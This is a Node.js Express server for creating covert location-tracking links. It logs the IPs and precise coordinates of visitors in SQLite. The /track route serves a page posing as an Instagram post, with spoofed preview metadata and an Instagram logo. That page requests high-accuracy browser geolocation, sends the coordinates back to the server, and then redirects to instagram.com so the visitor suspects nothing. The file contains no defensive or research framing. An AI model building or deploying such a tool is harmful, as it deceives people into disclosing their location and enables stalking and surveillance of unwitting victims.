const express = require('express');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Database initialization - using file-based storage for persistence
const db = new sqlite3.Database('./location_tracker.db', (err) => {
  if (err) {
    console.error('Error opening database:', err);
  } else {
    console.log('Connected to SQLite database.');
  }
});

// Create tables if they don't exist
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS tracking_links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token TEXT UNIQUE,
    name TEXT,
    tracking_id TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    clicks INTEGER DEFAULT 0
  )`);

  db.run(`CREATE TABLE IF NOT EXISTS locations (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id INTEGER,
    ip_address TEXT,
    latitude REAL,
    longitude REAL,
    accuracy REAL,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(link_id) REFERENCES tracking_links(id)
  )`);
});

// Generate a random token
function generateToken(length = 16) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let token = '';
  for (let i = 0; i < length; i++) {
    token += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return token;
}

// Get client IP address
function getClientIp(req) {
  return req.headers['x-forwarded-for'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress ||
         (req.connection.socket ? req.connection.socket.remoteAddress : null);
}

// Routes

// Create a new tracking link
app.post('/api/links', (req, res) => {
  const { name, trackingId } = req.body;
  const token = generateToken();
  
  const stmt = db.prepare(`INSERT INTO tracking_links (token, name, tracking_id) VALUES (?, ?, ?)`);
  stmt.run(token, name, trackingId, function(err) {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    // Construct the tracking URL
    const trackingUrl = `${req.protocol}://${req.get('host')}/track/${token}`;
    
    res.json({
      id: this.lastID,
      token,
      name,
      trackingId,
      url: trackingUrl,
      createdAt: new Date().toISOString(),
      clicks: 0
    });
  });
  stmt.finalize();
});

// Get all tracking links
app.get('/api/links', (req, res) => {
  db.all(`SELECT * FROM tracking_links ORDER BY created_at DESC`, (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json(rows);
  });
});

// Get a specific tracking link
app.get('/api/links/:id', (req, res) => {
  const id = req.params.id;
  
  db.get(`SELECT * FROM tracking_links WHERE id = ?`, [id], (err, row) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    if (!row) {
      return res.status(404).json({ error: 'Link not found' });
    }
    
    // Get locations for this link
    db.all(`SELECT * FROM locations WHERE link_id = ? ORDER BY timestamp DESC`, [id], (err, locations) => {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      
      res.json({
        ...row,
        locations
      });
    });
  });
});

// Track a location
app.get('/track/:token', (req, res) => {
  const token = req.params.token;
  const ip = getClientIp(req);
  
  // Find the tracking link
  db.get(`SELECT * FROM tracking_links WHERE token = ?`, [token], (err, link) => {
    if (err) {
      return res.status(500).send('Server error');
    }
    if (!link) {
      return res.status(404).send('Tracking link not found');
    }
    
    // Update click count
    db.run(`UPDATE tracking_links SET clicks = clicks + 1 WHERE id = ?`, [link.id]);
    
    // Try to get location from query parameters
    const lat = parseFloat(req.query.lat);
    const lng = parseFloat(req.query.lng);
    const acc = parseFloat(req.query.acc);
    
    if (!isNaN(lat) && !isNaN(lng)) {
      // Save location to database
      const stmt = db.prepare(`INSERT INTO locations (link_id, ip_address, latitude, longitude, accuracy) 
                               VALUES (?, ?, ?, ?, ?)`);
      stmt.run(link.id, ip, lat, lng, isNaN(acc) ? null : acc, function(err) {
        if (err) {
          console.error('Error saving location:', err);
        }
      });
      stmt.finalize();
    }
    
    // Return a simple page that tries to get precise location
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Instagram</title>
        <meta property="og:title" content="View this post on Instagram">
        <meta property="og:description" content="Check out this post!">
        <meta property="og:image" content="https://images.unsplash.com/photo-1579547621700-03c2c337370a?ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80">
        <meta property="og:url" content="https://instagram.com/p/Cs9f4W9OQ/">
        <meta name="twitter:card" content="summary_large_image">
        <script>
          // Try to get precise location
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              function(position) {
                // Redirect with location data
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const acc = position.coords.accuracy;
                window.location.replace("/track/${token}?lat=" + lat + "&lng=" + lng + "&acc=" + acc);
              },
              function(error) {
                console.error('Geolocation error:', error);
                document.getElementById('status').innerText = 'Loading...';
                setTimeout(function() {
                  window.location.href = 'https://www.instagram.com/';
                }, 2000);
              },
              { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
            );
          } else {
            document.getElementById('status').innerText = 'Loading...';
            setTimeout(function() {
              window.location.href = 'https://www.instagram.com/';
            }, 2000);
          }
        </script>
        <style>
          body { 
            font-family: Arial, sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background: #fafafa;
          }
          .container { 
            text-align: center; 
            padding: 20px; 
          }
          .logo {
            font-size: 40px;
            font-weight: bold;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 20px;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="logo">Instagram</div>
          <p id="status">Loading post...</p>
        </div>
      </body>
      </html>
    `);
  });
});

// Get locations for a tracking link
app.get('/api/links/:id/locations', (req, res) => {
  const id = req.params.id;
  
  db.all(`SELECT * FROM locations WHERE link_id = ? ORDER BY timestamp DESC`, [id], (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json(rows);
  });
});

// Delete a tracking link
app.delete('/api/links/:id', (req, res) => {
  const id = req.params.id;
  
  db.run(`DELETE FROM locations WHERE link_id = ?`, [id], function(err) {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    
    db.run(`DELETE FROM tracking_links WHERE id = ?`, [id], function(err) {
      if (err) {
        return res.status(500).json({ error: err.message });
      }
      res.json({ message: 'Link deleted successfully' });
    });
  });
});

// Search for tracking links by ID
app.get('/api/links/search/:trackingId', (req, res) => {
  const trackingId = req.params.trackingId;
  
  db.all(`SELECT * FROM tracking_links WHERE tracking_id LIKE ? ORDER BY created_at DESC`, [`%${trackingId}%`], (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message });
    }
    res.json(rows);
  });
});

// Serve the frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});